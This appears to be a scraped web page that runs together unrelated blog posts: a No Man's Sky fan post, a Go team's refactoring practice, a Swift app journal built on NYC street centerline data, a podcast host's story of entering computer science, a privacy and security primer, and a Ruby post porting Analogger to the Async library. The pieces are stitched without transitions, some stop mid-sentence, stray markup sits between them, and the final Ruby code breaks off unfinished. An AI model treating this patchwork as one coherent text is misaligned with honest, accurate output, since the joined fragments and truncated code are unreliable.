<div><figure><a href="https://nmsspot.com/wp-content/uploads/2020/06/yellow_wild_big-1.jpg"><img src="https://nmsspot.com/wp-content/uploads/2020/06/yellow_wild.jpg" alt="" width="391" height="220" srcset="https://nmsspot.com/wp-content/uploads/2020/06/yellow_wild.jpg 850w, https://nmsspot.com/wp-content/uploads/2020/06/yellow_wild-300x169.jpg 300w, https://nmsspot.com/wp-content/uploads/2020/06/yellow_wild-768x432.jpg 768w, https://nmsspot.com/wp-content/uploads/2020/06/yellow_wild-480x270.jpg 480w" sizes="(max-width: 391px) 100vw, 391px"></a></figure></div>



<p>And, when it comes to <em>No Man’s Sky</em>, my <em>favorite</em> area of speculation is precisely that of the procedural generation system. I have made frequent mention of <a href="https://nmsspot.com/2019/03/21/a-few-words-from-a-no-mans-sky-time-traveler/">my desire</a> for <em>No Man’s Sky</em> to take back on a “wilder” aspect, the sort that characterized the early days of the game. (This is why <a href="https://nmsspot.com/2019/11/18/a-progress-update-from-a-no-mans-sky-time-traveler/">I am presently playing the 2016 <em>Foundation</em> 1.1 version</a> alongside the current <em>Beyond</em> release.) The best scenario I can picture would be a combination of the worlds we have had since the <em>NEXT</em> release, and a far wilder set of worlds harking back to the days of <em>Foundation</em>, <em>Path Finder</em>, and <em>Atlas Rises</em> — or, perhaps wilder still. </p>



<p>It is obviously the case that the “leaked” information, along with promises of what may actually grow out of the data mined details, need to be taken with a Faecium-sized chunk of salt. But…it seems there might <em>just</em> be a chance that I will get what I’ve been long hoping for. As always, time will tell.</p>

<p>My team has been spending less of our “free” time working on bugs and features from the backlog, and more time refactoring our codebases and test suites. As a result, and perhaps somewhat counterintuitively, we’ve noticed a significant increase in our throughput of features and bug fixes.</p>



<p>As it turns out, its easy to find bugs and add features to a well-written codebase that the entire team is familiar with. Go figure.</p>



<p>My team started a loose goal to spend 25% of our time refactoring, revisiting, and restyling existing code and tests. Let’s go over some of the benefits we’ve seen since making the change.</p>



<h2>Context and Caveats</h2>



<p>I’ve found that in articles like this it’s important to give as much context to the situation as possible, as certain development methodologies may work better or worse in teams with a different size, tech stack, or development process. Here are some notable things about our situation:</p>



<ul><li>3 engineers on my team, ~16 in the company</li><li>Tech stack – Go, Postgres, ElasticSearch and RabbitMQ</li><li>Microservices architecture on Kubernetes</li><li>Kanban-style development process – <a href="https://qvault.io/2020/05/18/leave-scrum-to-rugby-i-like-getting-stuff-done/">no scrum</a></li><li>Our team is responsible for ~14 repositories</li><li>Each repo represents a small service in a data pipeline process that handles sorting and NLP of social media posts</li></ul>



<div><figure><img loading="lazy" src="https://qvault.io/wp-content/uploads/2020/09/go_kubernetes-1024x592.png" alt="Go Kubernetes" width="512" height="296" srcset="https://qvault.io/wp-content/uploads/2020/09/go_kubernetes-1024x592.png 1024w, https://qvault.io/wp-content/uploads/2020/09/go_kubernetes-300x173.png 300w, https://qvault.io/wp-content/uploads/2020/09/go_kubernetes-768x444.png 768w, https://qvault.io/wp-content/uploads/2020/09/go_kubernetes-150x87.png 150w, https://qvault.io/wp-content/uploads/2020/09/go_kubernetes.png 1245w" sizes="(max-width: 512px) 100vw, 512px" title="go kubernetes"></figure></div>



<h2>Code Familiarity</h2>



<p>With only 3 engineers on the pipeline team and ~14 repositories (Mostly REST APIs and ETL processes), it was hard for all three of us to be super familiar with all the code. When we needed a new microservice, one team member typically wrote the first iteration, and one other team member did a quick code review. The engineer who did the first iteration would then be primarily responsible for bug fixes and new features relating to that project.</p>



<p>By focusing more of our time on reviewing and refactoring existing code, it gave us a chance to hop into projects that we never would have had a reason to become familiar with. Not only does getting more eyes on a project mean the overall code quality will likely go up, but it also means we aren’t hosed when the original maintainer has gone.</p>



<h2>Slow to Fix Bugs</h2>



<p>When you get deep into spaghetti code, it can be really hard to find bugs. Not only that but in a messy codebase, sometimes fixing a bug can actually <em>add</em> to the “uncleanliness” of the code. You may have to exacerbate or extend an already bad architectural pattern in order to get a bug fix in.</p>



<p>Ideally, you would do the refactoring first and then fix the bug (assuming the bug still exists after a good refactoring). Unfortunately, oftentimes there isn’t enough time to refactor a project before fixing a critical bug. For this reason, we should always be refactoring so that bug fixes can happen quickly and won’t make the code quality worse than it is.</p>



<h2>Slow to Add Features</h2>



<p>I don’t want to beat a dead horse, the reasoning here is largely the same as with bug fixes. Adding features to a messy codebase just makes it messier. It’s like frosting a cake that’s been thrown on the ground – it might taste marginally better but now it’s even harder to clean up.</p>

<h2>Try It Yourself</h2>



<p>Since adding a consistent refactoring process to our team’s routine, we’ve been able to put <em>more</em> features through to production while spending <em>less</em> time working on them. Let me know what you think and if you have a difference experience.</p>

                <p><small>September 1st</small></p>
<p>I do a lot of work with web build systems and performance, but I got into
writing software because I like making products. With all the free time that the
pandemic has brought, I’ve been spending my off-hours teaching myself to write
Swift instead of screaming into the void. I missed writing product code and I
missed writing a compiled language with a nice IDE and a type system. I also
missed the speed and responsiveness that comes with native code that you only
get in the browser if you are extremely careful. So, I decided to try and build
an iOS app in <a href="https://developer.apple.com/swift/">Swift</a>. This post is the first of a handful where I try to
digest what I’m working on. Think of this more as a journal than any sort of
tutorial.</p>
<h2>What are you making then?</h2>
<p>My goal is to make an app that will show me where I’ve been in New York on a
block-by-block basis. New York is big and I’ve only lived here for 5 years, so
an app that shows me where I’ve been might also show me what I’m missing.</p>

<p>From a technical perspective, I want to try and use <a href="https://developer.apple.com/xcode/swiftui/">SwiftUI</a> to build
my app and <a href="https://developer.apple.com/documentation/coredata">Core Data</a> to persist its data. I also want to avoid 3rd
party libraries if possible. If, like me, you’re new to a lot of this, SwiftUI
is Apple’s new view framework, and Core Data is Apple’s built-in data
persistence layer. I won’t go into a ton of detail on these libraries in this
post, but a little context seems important. I figure these constraints will
force me to get experience with the core pieces of iOS development, which is
most of why I’m writing this app in the first place.</p>
<h2>Getting New York’s road data</h2>
<p>To start, I need to think about how I want this app to work. Ideally, I want to
break streets up into segments by block. I’m defining a block here as <strong>the
chunk of a street between any two adjacent intersections</strong>. For example,
Division Avenue between Berry Street and Bedford Avenue is a block, as is Berry
Street between Division Avenue and S 11th Street. To do this, I’ll need a way to
represent a road segment so that I can store metadata about it. I’ll also need
to know every possible road segment in New York so that I know what I have and
have not visited. Getting at this data turns out to be not so straightforward.</p>
<h3>Apple Maps</h3>
<p>I started by looking at what Apple would give me. When you want to render a map,
Apple provides you with a view. They also provide you with a way to search for
locations and a way to get directions between two locations.</p>
<p>However, there’s no way to get at any of the data directly. If I want the names
of roads nearby, or even the name of the road that’s closest to my location, I’m
out of luck. I needed to be able to get a catalog of road segments and identify
the closest one from wherever I am. This data takes a while to collect, and
anyone who’s collected enough of it isn’t willing to give it away, with the
except the beautiful people who maintain OpenStreetMap.</p>

        </figure>
<h3>OpenStreetMap</h3>
<p><a href="https://www.openstreetmap.org/">OpenStreetMap</a> is like Wikipedia for street data. It seemed like a natural
place to look since its data is free to use and is constantly being updated. The
reality is that map data is really, really big, and getting at the data for just
New York City is gross. OpenStreetMap lets you <a href="https://www.openstreetmap.org/export#map=13/40.7192/-73.9564&amp;layers=C">export</a> regions of
map data, but exporting an area bigger than that a square mile or so ends up
being too big a request for them to process. My options were either to:</p>
<ul>
<li>Download a lot of smaller regions and stitch them together.</li>
<li>Download <a href="https://planet.openstreetmap.org/">all of OpenStreetMap’s data</a> in one big ol’ file and
extract the data I needed.</li>
</ul>
<p>Seeing as I didn’t know much about how to use this data, neither option seemed
especially great. On the bright side, there are a few third parties that <a href="https://download.bbbike.org/osm/bbbike/NewYork/">will
extract data</a> from OpenStreetMap for popular regions like cities. I
ended up finding and downloading some of the data for New York City, which ended
up being extremely detailed. The data included road segments, neighborhood
names, building shapes, and everything else you might imagine needs to be
represented on a map. It was also about a gig and a half of JSON, and while this
level of detail is great, I only really needed data on roads.</p>
<h3>New York’s Centerline Data</h3>
<p>Around this time, I learned about New York City’s Open Data initiative. They
host a project called <a href="https://data.cityofnewyork.us/City-Government/NYC-Street-Centerline-CSCL-/exjm-f27b">The NYC Street Centerline</a>, which holds data
about New York’s roadbeds. It’s a fantastic start, but it’s not as polished as
OpenStreetMap’s data. For example, take a look at this screenshot of NYC’s data
on top of Google Maps. The blue lines are roads rendered from Centerline data.
Note the discrepancies, especially around driveways, walking paths, and parking
lots.</p>

        </figure>
<p>It also appears to be missing a lot of data about roads through some parks and
cemeteries, which would be nice to know about. Here’s what Woodlawn Cemetery
looks like, for example:</p>

        </figure>
<p>I’m betting OpenStreetMap’s data is more accurate than NYC’s here, but NYC’s
data is a solid start. It’s exclusively road data, so the actual file size is
about ten times smaller than the OpenStreetMap data for New York. Plus, it comes
with a bunch of fun attributes, like how wide the road is, the street numbers on
each side, and even what priority the street gets when snow needs to be plowed.
I’m betting I’ll want to end up using OpenStreetMap at some point, but for now
this seems like a good way to get started.</p>
<h2>Making sense of a 134.5MB JSON file</h2>
<p>Centerline hosts their data in a bunch of different types of formats, but most
of them looked like they’d require extra parsing to make sense of, as though
they were all just created from dumps of a <a href="https://postgis.net/">geospatial database</a>. For
example, JSON-formatted data was a list of un-keyed data, with the road’s
coordinates encoded as a <a href="http://help.arcgis.com/en/geodatabase/10.0/sdk/arcsde/concepts/geometry/shapes/types.htm">Multilinestring</a> that would need
to be parsed:</p>

<p>However, they did offer their data hosted as <a href="https://geojson.org/">geoJson</a>, which is a
specification for encoding geodata as json (surprise). It’s a bit more verbose,
so the filesize is a bit bigger, but filesize is a bit less of a concern when
your data is already a hundred megabytes. In geoJson, that same road segment

<p>I had a lot of trouble figuring out how to open and explore this file. Getting
an understanding of its shape is a requirement if I wanted to parse it into any
sort of app, and to do that I needed to poke around. Opening the file in Xcode
caused it to crash pretty reliably. VSCode similarly hung for a while, and when
it finally responded a bunch of navigation features seemed to be disabled. To
help explore all of this data, I ended up using an app called
<a href="https://viewer.dadroit.com/">Dadroit</a>, a JSON viewer specifically made for viewing large files
quickly.</p>

<p>Using Dadroit gave me enough context on the shape of the data to be able to

got far enough into the data to be able to highlight a bunch of random roads
from it.</p>

					<div><p>Transcript:</p><p>Hello, and welcome to the software engineering unlocked podcast. I’m your host, Dr. McKayla. And today is a special episode. Yeah, the software engineering unlocked podcast turned one. And to celebrate the one year anniversary – and can you imagine it’s already one year – I thought I will tell you a little bit about myself.</p><p>I will very inline with the theme of the show, I will tell you a little bit about how I came into tech, a little bit about my experiences with different companies. And also I will tell you about my favorite topic code review. So yeah, let’s see how that goes. I’m a little bit nervous because it’s first not interview-style podcast episode. So it means that I don’t have another person interviewing me and asking me questions. So it will be all me talking. And I hope that this goes well, I don’t know. So yeah, about me. Well, where should I start? Maybe really from the beginning, like I do with my guests. So how did I actually come into tech?</p><p>You know, that’s&nbsp; quite a strange story, because I went to a high school, that was all about art. And while it’s way back then a computer were already a thing. I’m not that old, but, uh, at my school, we didn’t have laptops in our class. We didn’t write on a word for example, or some, um, word processor or something.</p><p>We rode really still with pencil on paper. And especially when I graduated the time were already advanced. So in other school, people were using computers and programs to type, and our school was an art school. And so we were not very progressed. Uh, our teachers also thought, you know, it’s, it’s not a good thing.</p><p>You know, writers write on paper. So even though when I graduated, I was still writing most of my stuff. Oh, really with pen and paper. And I had little to no exposure to computers. We had a computer at home, but because it’s, um, it was something expensive and it was something, you know, that also my parents were maybe a little bit afraid of, we were not allowed to just go and play with the computer or try things out.</p><p>So I really have to say my exposure to computers were really, it was really, really limited. Never ever would I have starting this year that I will study computer science, but I’m in the lab last year before graduating and before starting a university, I actually attended a few lectures at the university and I attended lectures in different areas.</p><p>So I was in one lecture about psychology. I was in an, um, lecture about physics and I was in the left. Sure. About algorithms. And somehow I was really hooked. I never, I actually thought I will study math. This is what I thought that I will go on. But then when, when I was in this lecture and this professor talked about distributed systems and threading problems, and he also were talking about cash machines.</p><p>And so I really could see the application of what very much looked like math to me and logic. But I could see really the impact that it has on the real world. Yeah. And so I think I was hooked. So I got a first book about it. And during the summer break, before starting university, I read this book, it was about really fundamentals.</p><p>What is an algorithm and what is computer science still? I didn’t touch any computers. Right. It was really theoretical knowledge about, you know, what computer science is all about. And there was really, really fascinating. I thought, this is what I want to do. And so when I made the decision and I said, I’m going to apply, my parents were not thrilled.</p><p>They were like, this is not for girls. And this is not for you. And you’re coming from an art background, which was very true. Right. I was mainly painting pictures. I drew, I had paintings and things like that, architecture, but, um, I was always good at math and. I decided, even though they weren’t happy and actually even said, they’re not going to really support me doing that.</p><p>I went ahead, add end. I’m enrolled. And the enrollment was actually online and yeah, mr. We failed to be honest. Yeah. I really failed to create an account. You know, dad. This was the current state that I was in. Right. So I got a little bit worried about, um, if I’m not even able to in role, because I had so little exposure to computers and internet and things like that.</p><p>We didn’t have internet at home. Um, How I’m gonna deal with that. But yeah, there was an it department, so they helped me actually enroll when I told them that I, they, I need some assistance with that and that I actually want to study computer science. They were also not super thrilled and I laughed a little bit about me, uh, but I managed to get the thing done with a little bit of help.</p><p>And, and then it was. It was really intense. I would say her first year, especially the first half year, really intense. Most of my, um, classmates, my colleagues at university had a lot of knowledge already became, um, most of them actually came from high schools that had like, uh, Focused on computers, even new houses program.</p><p>And for me, everything was new and I didn’t have really a computer and I didn’t have so much money. So I bought really a crappy computer and, um, it wasn’t good enough for, for example, the job compilers really run. So if I wanted to combine my hello world, the first program that I a road, it took several minutes, like 15 minutes.</p><p>It can you imagine? So. Um, I knew I had to do something else, so I try to collect a little bit more money and make more money. I worked on the side. And so, um, within the first two, three months I was able to buy a better computer. And, um, it wasn’t the best computer. Yeah. It was really nice. A nice laptop that, uh, got the job done.</p><p>Let’s put it that way. And also, I have to say that in my computer science education, especially at the beginning, we did again, a lot things on, um, Paper. I mean, we wrote Java programs on paper. Um, not always URI. I needed a computer and you were doing it at home, right? Well then transferring. Yeah. What you learned in class?</p><p>Um, To the computer. Uh, but yeah, so this is how I got started. And, um, I did the primer in programming that really helped a lot. It was very, very intense, but I, I studied a lot. Um, this is pure reality is that I really studied a lot and I really, you know, deep dive into that, I found it really also very, very fascinating.</p><p>So it wasn’t, wasn’t hard for me. And by the, by the end of the first year, I was one of the best in class. And, um, this was very encouraging as well. So I, I didn’t start really well. Uh, but yeah, based on learning a lot and really having an open mind and being so curious, I was able to, to level up. So is, it was really how I started.</p><p>Maybe I rambled a little bit too long, but hopefully found it interesting. And yeah, well I did then back then, actually, when I did my, my, my. Bachelor. There were no bachelor and masters in Austria. I did my, my, uh, university in Austria, but this was one five year program. And so in the middle of when I started, they actually changed the thing to master and bachelor, but because I already took master classes, um, in my bachelor’s, I then actually.</p><p>Uh, pursued the whole thing and did a bachelor in the master and the master. I did partly in London, in the vestments there university, and this was really one of my best times. It was the first time that I went away from home. And, uh, somehow I got a little bit hooked. I really left being away and learning about new cultures.</p><p>Um, having a complete different perspective on life, uh, through those travels through those months abroad. And so when I finished my masters, I knew that I’m not gonna stay. So I started actually as a lecturer, the university, and I teach the system security and complexity theory. Hmm. The algorithms. So something like that, introduction to algorithms.</p><p>Um, so, but I knew that I wanted something else. So I looked around and I found a PhD program. And I applied and it was actually in the Netherlands. And I also have to say that when I graduated, this was 2008, it was a regression. Right. So, uh, it wasn’t the best job market. And, uh, maybe, um, I don’t know if I would have done a PhD, if there would be a better job market I wanted to go into.</p><p>What I always wanted to do is industrial research. Right? So I wanted to be in industry and do the research side, but that bind, I think it was just not possible. There was no money and especially companies didn’t hire a lot of people into research, which somehow is not the most necessary thing. I think that if times are, you know, difficult, um, a lot of resources go away from, from research.</p><p>Anyway. So I went actually to the Netherlands and I did my PhD program there. Um, I was mainly looking at how people software system, so software comprehension, can we build models around. Large software systems, so that it’s easier to really know what’s happening here to get an overview. And I was also diving into testing.</p><p>So especially test systems when we are testing something, how do we know, how do we know what we should test? Which integrations for example, should we test? And I’m experimenting with things that help people really to understand their. Test suites, but another aspect of dad was God, more than more into qualitative studies.</p><p>So what I really enjoyed was doing this quantitative things. So like you’re looking at data you’re analyzing. Software repositories data that you’re getting from, uh, from what they, what the engineers produce. Right. So you’re looking at commits, you’re looking at the source code. You’re looking at, um, maybe interactions that engineers are having.</p><p>Right. But there’s in a, in a very quantitative way. Um, so you’re doing a lot of data mining there and, um, maybe. I have some algorithms around to extract entrance, interesting patterns, but then compliment that with a qualitative research. So instead of saying, well, we extracted, you know, let’s say to get history and then we saw, and we have some way to detect, let’s say …</p></div></div></div></div></div></div></div></div></section></div>

If you want to avoid these topics, please jump to the last paragraph of this introduction, starting with ‘Enough about the depressing stuff.’</em></p><p>Before we start, I feel like I need to give a bit of background on why I care so deeply about privacy. It’s partly historical. Being Ashkenazi, I learnt from a very young age about the importance of sensitive information, and who you give that information to. My grandfather broke the law by not going to the police station to register himself as a Jew. The Holocaust saw 76,000 Jews deported to death camps from France alone - around 1/4th of the country’s Jewish population at the time. There’s a chance that not being part of the Jewish census saved his life. Lesson: be careful who you give sensitive information to.</p><p>That grandfather and two of his brothers left Paris in the middle of the war, and took a train south with no plan, no luggage, no contact, and no destination other than, well, heading south. They were helped by strangers and survived. Their mother however, along with two other siblings, had a plan. They had a deal with a smuggler to reach unoccupied France. The smuggler informed the Nazis, and all 3 of them died in deportation. Lesson: each person who has information on you represents an additional chance for it to be leaked.</p><p>And yes, we can raise the irony of mentioning my Jewish grandpa to warn you against sharing sensitive information online. There, I just did.&nbsp;</p><p>While this happened in the 1940’s, a data point’s lifespan is drastically different today. It’s possible that you posted something online 10 years ago, and it was fine back then, but 20 years from now you will hope that no one finds it. My message is: the Internet never forgets, cultures change, and retroactive laws exist. People can get screwed over digital data. Let’s take the obvious example: China’s state surveillance has an eye on literally each and every move of its inhabitants, whether physical or digital. The state uses extensive data to allocate social scores, which can have a <a href="https://www.abc.net.au/news/2018-09-18/china-social-credit-a-model-citizen-in-a-digital-dictatorship/10200278?nw=0" target="_blank">drastic impact</a> on Chinese people’s life, including banning them from purchasing train or plane tickets, providing them with lower Internet speed, and denying them visas and loans. China also makes use of this surveillance system <a href="https://edition.cnn.com/interactive/2020/02/asia/xinjiang-china-karakax-document-intl-hnk/" target="_blank">against its Uyghur population</a>, detaining between 1 and 2 million people - the estimates vary - in concentration camps, where prisoners suffer <a href="https://en.wikipedia.org/wiki/Xinjiang_re-education_camps#Testimonies_of_treatment" target="_blank">extensively reported torture, brainwashing and forced labour</a>.&nbsp;</p><p>Apart from governmental issues, there’s also the topic of pervasive <a href="https://www.youtube.com/watch?v=iFTWM7HV2UI" target="_blank">tracking and ads</a>, championed by Facebook and Google. I’m yet to see the difference between today’s digital advertising and individually-customised mass manipulation. Maybe because there is none. Please try and change my mind if you have any conclusive elements.</p><p>Enough about the depressing stuff. I’ve explained why your privacy matters, and we’re now about to dive into a few security concepts. I wrote this article with <a href="https://twitter.com/lp1eu" target="_blank">lp1</a>, as he knows much more about these concepts than I do. So here’s my first pro tip for you, unrelated to privacy or security: date people you admire. Now, let’s get into the technical aspects.</p><h2>CIA</h2><p>The CIA ‘triad’ is a summary of the main concepts of information security. There are 3 aspects regarding information which are targeted by infosec:</p><ul data-rte-list="default"><li><p><strong>Confidentiality</strong>:<strong> </strong>the assurance that a piece of information can only be observed by authorised third parties.</p></li><li><p><strong>Integrity</strong>:<strong> </strong>the assurance that a piece of information is and stays accurate over time.</p></li><li><p><strong>Availability</strong>: the assurance that a piece of information can be accessed by an authorised user when they need it.</p></li></ul><h2>Encryption: Server-side vs. Client-side</h2><p>Encryption secures data and aims to maintain its confidentiality and integrity.</p><p>We differentiate server-side from client-side encryption. Server-side means that only information stored on said server is encrypted. This means that the company has the encryption key, and therefore can access your communication (yes, including your nudes). However, server-side encryption doesn’t apply to the <strong>transmission </strong>of your communication. The data you share is not necessarily encrypted, only the storage is, which is why you should favour platforms that use <a href="https://en.wikipedia.org/wiki/HTTPS" target="_blank">https</a>.</p><p>Client-side – or end-to-end – encryption means that the transmission of your information is encrypted, and that <strong>only your device</strong> has the key. If you log in from a different device, you won’t be able to see the exchanges. Since the company <strong>does not have the key</strong>,<strong> </strong>they cannot access your messages. As a result, even if they were to store your exchanges, said exchanges would automatically be encrypted. However, this also means that you won’t be able to recover your messages, should you lose the key.</p><p>In the case of a communication service, this means that the nudes you're sending to <strong>someone you trust</strong> are encrypted from your device to the company's server, as well as from their server to your trusted partner's device. Without encryption however, anyone on your network can see and tamper with all your communications. By 'tamper with', we mean any kind of modification by an unauthorised third-party. Examples include someone changing your password and email address on a platform to take over your account, deleting your private files on a cloud file storage service, replacing software in your online backups with malware, etc.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1598877921511_5282"><div><p>A recent example is the July Twitter hack, during which <a href="https://twitter.com/TwitterSupport/status/1286088135525318656" target="_blank">hackers managed to read users' messages from Twitter's admin control panel</a>. &nbsp;With end-to-end encrypted DMs, no one at Twitter would have been able to access them.</p><h2>Encryption vs. Hashing</h2><p>A distinction has to be made between two important notions: encryption and hashing. Encrypting information means that you turn it into scrambled text which can be decoded with a key. For instance, it's useful to make sure a communication between two peers cannot be read by an unauthorised person.&nbsp;</p><p>Hashing a piece of data on the other hand means that you turn it into a <strong>unique signature</strong> which <strong>cannot be reversed</strong> into its original readable state. The only way for someone to obtain the original input based on the hashing output, is to try inputs themselves until their output matches. Hashing is not intended as a cypher to decrypt, which is why encryption and hashing serve different purposes and are used in different cases. Hashing is noticeably useful to store passwords, because you avoid storing the actual easy-to-steal-and-reuse passwords. Instead, you compare the hashing output that you store to the hashing output of what a user entered while trying to log in. If you get the same hash that you’ve stored, then the password is correct.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1598877921511_7990"><div><h2>100% secure does not exist</h2><p>Flaws and vulnerabilities can always be found. However, the sturdier your tools, the safer you'll be. And contrary to <a href="https://www.youtube.com/watch?v=djV11Xbc914" target="_blank">what A-ha used to sing</a>, it is better to be safe than sorry.</p><h2>Free vs. Open source</h2><p>Free and open source software are specific philosophies, based on specific values. Free software specifically refers to the notion of users' freedom, which isn't the case in open-source software. As <a href="https://www.gnu.org/philosophy/free-sw.en.html" target="_blank">the GNU website</a> puts it: 'To understand the concept, you should think of “free” as in “free speech,” not as in “free beer”'.</p><p>There are 4 criteria for software to be free:</p><ul data-rte-list="default"><li><p>Freedom 0: The freedom to run the programme as you wish, for any purpose.</p></li><li><p>Freedom 1: The freedom to study how the programme works, and change it so it does your computing as you wish. This entails having access to the source code.</p></li><li><p>Freedom 2: The freedom to redistribute copies so you can help others.</p></li><li><p>Freedom 3: The freedom to distribute copies of your modified versions to others.</p></li></ul><p>On the other hand, open-source software has a <a href="https://opensource.org/osd" target="_blank">less strict definition</a>, and a different philosophy. You can also see the source code, amongst other things.</p><p>If you want to get into the political aspect of these terminologies, <a href="https://www.gnu.org/philosophy/floss-and-foss.en.html" target="_blank">here</a>’s a good explanation.</p><h2>Credential stuffing attack</h2><p>Credential stuffing is a popular attack whose goal is to automatically test a user’s known credentials on multiple platforms on a large scale. Nowadays, it is widely used by malicious intruders because of the online accessibility of billions of credentials gathered from data leaks (<a href="https://www.troyhunt.com/dating-the-ginormous-myspace-breach/" target="_blank">MySpace</a>, <a href="https://www.bleepingcomputer.com/news/security/dailymotion-allegedly-hacked-85-million-user-accounts-stolen/" target="_blank">Dailymotion</a>, <a href="https://www.troyhunt.com/the-dropbox-hack-is-real/" target="_blank">Dropbox</a> to name some of the biggest).</p><p>And there you have it, a roundup of the main security concepts.

<h2>In The Beginning</h2>



<p>A little over 13 years ago, I had been working as a freelance developer for over five years, primarily writing and hosting Ruby based web sites and applications for a variety of commercial interests, from mutual funds to construction to education. </p>



<p>I had designed and built a reliable system architecture for deploying and managing dozens of disparate sites and applications. However, I frequently encountered an annoying logistical problem when I was diagnosing and debugging client issues. For both load handling and for redundancy purposes, many of these sites ran on two or more application server instances. This necessarily meant that there were two or more sets of logs being generated on different instances/machines.</p>



<p>If there were commercial log aggregator offerings at that time, I wasn’t aware of them, and for various reasons I didn’t like the idea of trying to use <a href="https://sematext.com/blog/log-aggregation/#toc-syslog-rsyslog-or-syslog-ng-8" target="_blank" rel="noreferrer noopener">syslog</a> to fill the gap, so I chose to write my own solution. I did everything with Ruby, and I wasn’t afraid of the challenge of writing a Ruby based system that was both fast enough and reliable enough for this purpose, so I dove in and I hacked something out.</p>



<p><a rel="noreferrer noopener" href="https://github.com/wyhaines/analogger" target="_blank">Analogger</a> was born.</p>



<h2>The Backstory</h2>



<p>Analogger was written using <a rel="noreferrer noopener" href="https://www.ruby-lang.org/en/news/2007/03/12/ruby-1-8-6-released/" target="_blank">Ruby 1.8.6</a>, and for high performance network IO, I used <a rel="noreferrer noopener" href="https://github.com/eventmachine/eventmachine" target="_blank">EventMachine</a>, which provides an <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Reactor_pattern" target="_blank">event reactor</a> implemented with C++, with an interface to Ruby, that lets one write high speed IO/network handling code in Ruby. As part of the package, I also wrote a logging client, which used pure Ruby to send the messages, so that whatever was using the client (such as a Rails app) did not have to be running an EventMachine reactor to use it.</p>



<p>I didn’t do much with it after that. It just worked. I announced the <a rel="noreferrer noopener" href="https://blog.engineyard.com/engine-yards-plans-for-ruby-1-8-6" target="_blank">Ruby 1.8.6 End-Of-Life</a> in 2011, but Analogger didn’t need much attention to adapt to later Rubies. Analogger just worked.</p>



<p>In my usage, at it’s peak, it handled millions of records a day, aggregating those logs into log files on a single dedicated logging instance. I fixed a few bugs here and there. I eventually made it available on <a rel="noreferrer noopener" href="https://github.com/wyhaines/analogger" target="_blank">Github</a> and as a <a rel="noreferrer noopener" href="https://rubygems.org/gems/analogger" target="_blank">gem</a>. I added a feature a few years ago so that one can avoid losing logging data if the server goes down. But mostly, I ignored it and just let it do it’s job. There was little that had to be done for it to work with newer Rubies as they were released, though the dependence on EventMachine meant that alternative Ruby implementations, such as JRuby, might not work so well (there has been a <a href="https://github.com/eventmachine/eventmachine/tree/master/java/src/com/rubyeventmachine">Java implementation of EventMachine</a> for a long time, but it’s feature parity with the Ruby version often lagged). However, like so many other people do so often with software that is running in production without any problems, I mostly took the approach of, “If it isn’t broken, don’t fix it.”</p>



<p>Fast forward to the present. I’m running Ruby 2.7.1. Rubygems is a first class citizen of the Ruby ecosystem. EventMachine is still around, and it’s still fast, but Ruby is faster now, too, and there are other ways to do things. There are also other interesting languages around like <a href="https://crystal-lang.org/" target="_blank" rel="noreferrer noopener">Crystal</a>, <a href="https://golang.org/" target="_blank" rel="noreferrer noopener">Golang</a>, and <a href="https://www.rust-lang.org/" target="_blank" rel="noreferrer noopener">Rust</a>, and a compelling argument could be made that low level, performance sensitive software like Analogger might better be written in a language like that.</p>



<p>So, a few weeks ago when I was looking through the Analogger code with that in mind, and it occurred to me that before I embark on a complete rewrite, it would be prudent to just renovate Analogger for the Ruby 2.7.1 world. The biggest part of that is that I wanted to convert it from dependence on EventMachine to the use of the excellent <a rel="noreferrer noopener" href="https://github.com/socketry/async" target="_blank">Async</a> library.</p>



<h2>The Journey</h2>



<p><a href="https://github.com/eventmachine/eventmachine" target="_blank" rel="noreferrer noopener">EventMachine</a> is great. It joined the Ruby ecosystem a long time ago, and it still sees regular use. That alone should be testimony to it’s utility and its performance. However, Ruby itself now has a much richer ecosystem surrounding it, which provides us with more options, and more choices.</p>



<p>Analogger is an asynchronous logger written around an event reactor. There is no reason that reactor can not itself be implemented primarily in Ruby.</p>



<p>Back at the end of 2011, <a href="https://github.com/tarcieri" target="_blank" rel="noreferrer noopener">Tony Acieri</a> started writing <a href="https://github.com/socketry/nio4r" target="_blank" rel="noreferrer noopener">nio4r</a>. It was modeled after Java’s NIO (Nonblocking IO). Taken from the current github page for the project:</p>


<pre title="">New I/O for Ruby (nio4r): cross-platform asynchronous I/O
primitives for scalable network clients and servers. Modeled
after the Java NIO API, but simplified for ease-of-use.

nio4r provides an abstract, cross-platform stateful I/O
selector API for Ruby. I/O selectors are the heart of
"reactor"-based event loops, and monitor multiple I/O objects
for various types of readiness, e.g. ready for reading or writing.
</pre>


<p>About three years ago <a href="https://github.com/ioquatix" target="_blank" rel="noreferrer noopener">Samuel Williams</a> started working on <a href="https://github.com/socketry/async" target="_blank" rel="noreferrer noopener">Async</a>, which is an event reactor implementation in Ruby, leveraging Nio4r. It is intentionally simple, with several companion projects that provide other capabilities such as IO, HTTP handling, process management, websockets, etc.</p>



<p>For the purposes of the renovation of Analogger, <a href="https://github.com/socketry/async-io" target="_blank" rel="noreferrer noopener">async-io</a> seems like the state of the art in Ruby event reactors, so let’s refactor the codebase to use it.</p>



<p>With EventMachine, the core of the usage is this:</p>


<pre title="">EventMachine.run {
  EventMachine.add_shutdown_hook do
    write_queue
    flush_queue
    cleanup
  end
  @server = EventMachine.start_server @config[-"host"], @config[-"port"], protocol
  EventMachine.add_periodic_timer(1) {Analogger.update_now}
  EventMachine.add_periodic_timer(@config[-"interval"]) {write_queue}
  EventMachine.add_periodic_timer(@config[-"syncinterval"]) {flush_queue}
}
</pre>


<p>In this code, <code>protocol</code> is a class that implements the network protocol, using EventMachine methods.</p>



<p>To convert the code to using Async (specifically, Async-IO), we remove EventMachine from the gemspec and add Async:</p>


<pre title="">spec.add_runtime_dependency 'async-io', '~&gt; 1.29'
</pre>


<p>Async offers some signal handling tools that EventMachine did not offer. In the original EventMachine based code, the following helper method was implemented:</p>


<pre title="">def safe_trap(siglist, &amp;operation)
  (Signal.list.keys &amp; siglist).each {|sig| trap(sig, &amp;operation)}
end
</pre>


<p>It’s usage was something like this:</p>


<pre title="">EXIT_SIGNALS = %w[INT TERM]
safe_trap(EXIT_SIGNALS) {handle_pending_and_exit}
</pre>


<p>Async’s signal handling is aware of the reactor event loop, and is written to interact with it. In order to keep the code within the Async event loop looking clean, helper methods for each of the signal handlers needed to be written. They follow this pattern:</p>


<pre title="">def install_hup_trap(task: nil)
  hup_trap = Async::IO::Trap.new(:HUP)
  hup_trap.install!
